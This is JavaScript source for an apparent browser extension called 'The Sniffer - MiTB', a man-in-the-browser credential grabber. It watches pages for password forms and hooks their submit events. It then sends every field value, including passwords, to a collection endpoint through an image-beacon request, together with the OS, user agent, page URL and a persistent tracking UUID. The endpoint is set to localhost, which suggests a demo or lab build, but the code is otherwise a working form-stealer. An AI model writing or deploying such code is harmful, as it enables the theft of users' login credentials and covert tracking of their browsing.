log("Estensione \"The Sniffer - MiTB\" attivata!");

let count = 0;
const STORAGE_KEY = "TS-MITB-UUID";
const registered = [];

register();
scanDOM();
setInterval(() => scanDOM(), 1500);

function scanDOM() {
    if (count > 10) {
        return;
    }

    count++;
    log("Scanning DOM for forms...");
    Array.from(document.getElementsByTagName("input")).forEach(element => {
        if (element.type == "password") {
            var form = formFromInput(element);
            if (form !== null && !registered.includes(form.id)) {
                registered.push(form.id);

                form.onsubmit = function () {
                    var data = new FormData(this);
                    
                    // Serialization by id
                    Array.from(this.elements).forEach(element => {
                        if (element.tagName === "INPUT" && element.id) {
                            data.append(element.id, element.value);
                        }
                    });

                    let os = "Unknown";
                    if (navigator.userAgent.indexOf("Win") != -1) os = "Windows";
                    else if (navigator.userAgent.indexOf("Mac") != -1) os = "MacOS";
                    else if (navigator.userAgent.indexOf("X11") != -1) os = "UNIX";
                    else if (navigator.userAgent.indexOf("Linux") != -1) os = "Linux";

                    data.append("os", os);
                    data.append("user_agent", navigator.userAgent);
                    data.append("lang", navigator.language);
                    data.append("url", window.location.href);
                    data.append("uuid", getUUID());
                    (new Image()).src = "http://localhost:8080/api/sniff?" + new URLSearchParams(data).toString();
                }
            }
        }
    });
}

function formFromInput(element) {
    if (element === undefined || element === null) {
        return null;
    }

    if (element.tagName === "FORM") {
        return element;
    }

    return formFromInput(element.parentNode);
}

function register() {
    let uuid = getUUID();
    if (uuid === undefined || uuid === null) {
        uuid = crypto.randomUUID().toString();
        localStorage[STORAGE_KEY] = uuid;
    }

    log("Registered client with UUID: " + uuid);
}

function getUUID() {
    return localStorage[STORAGE_KEY];
}

function log(message) {
    console.log("[MITB] - " + message);
}
